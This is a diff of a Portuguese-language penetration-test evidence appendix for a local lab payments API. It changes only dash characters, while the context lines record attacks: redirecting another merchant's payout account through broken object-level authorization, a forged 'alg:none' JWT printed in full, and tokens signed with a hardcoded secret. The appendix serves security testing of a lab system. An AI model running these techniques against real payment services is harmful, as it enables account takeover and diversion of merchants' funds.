@@ -1,5 +1,5 @@
 ================================================================
- APÊNDICE DE EVIDÊNCIAS — execução real contra http://localhost:3000
+ APÊNDICE DE EVIDÊNCIAS - execução real contra http://localhost:3000
  Lab: arara-lab (banco em memória, estado inicial a cada start)
  Data da captura: 2026-10-07 18:29 UTC
 ================================================================
@@ -10,7 +10,7 @@ $ curl -s -X POST localhost:3000/v1/auth/login -d '{"email":"contato@alphatrader
 # payload do token (sem campo exp):
 {"sub":"m_4821","iat":1791397791}
 
-### [E1] BOLA — trocar payout de OUTRO lojista (vítima m_0093) ###
+### [E1] BOLA - trocar payout de OUTRO lojista (vítima m_0093) ###
 # [antes] payout de m_0093:
   237 0001 12345-6 11222333000181
 $ curl -s -i -X POST .../v1/merchants/payout-account -H 'Authorization: Bearer <TOKEN_m4821>' \
@@ -19,7 +19,7 @@ HTTP/1.1 201 Created
 # [depois] payout de m_0093 (persistido):
   999 6666 00000-0 00000000000000
 
-### [E2] JWT alg:none — forja sem senha e sem segredo ###
+### [E2] JWT alg:none - forja sem senha e sem segredo ###
 token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtXzAwOTMifQ.
 $ curl -s localhost:3000/v1/merchants/m_0093 -H 'Authorization: Bearer <alg:none>'
 {
@@ -41,7 +41,7 @@ HTTP 201
 # [depois] m_5117:
   001 0001 13337-0
 
-### [E4] Segredo fixo 'arara-2024' — HS256 forjado aceito / segredo errado rejeitado ###
+### [E4] Segredo fixo 'arara-2024' - HS256 forjado aceito / segredo errado rejeitado ###
 token assinado com 'arara-2024'  -> HTTP 200
 token assinado com segredo errado -> HTTP 500
 
